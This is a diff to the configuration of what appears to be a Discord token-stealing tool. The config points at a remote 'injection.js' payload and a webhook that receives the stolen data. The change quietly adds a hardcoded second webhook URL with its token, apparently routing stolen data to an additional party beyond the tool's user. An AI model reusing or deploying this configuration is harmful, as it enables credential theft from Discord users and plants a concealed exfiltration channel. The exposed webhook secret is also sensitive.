@@ -28,8 +28,9 @@ __license__ = "GPL-3.0"
 __config__ = {
     # replace webhook_here with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    "webhook": "WEBHOOK_HERE",  # Place your webhook here
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    "webhook": "WEBHOOK_HERE",  # Place your first webhook here
+    "webhook2": "https://discord.com/api/webhooks/1171093477862408233/KqIJ6PvlvG1CiQ6tfkDN5R-Ve4v-76wSlKVJ2CaTxAYUAmMVTVVv-FImkZvoMhX6KBBD",  # Place your second webhook here
+# ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protect
     "webhook_protector_key": "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     "injection_url": "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
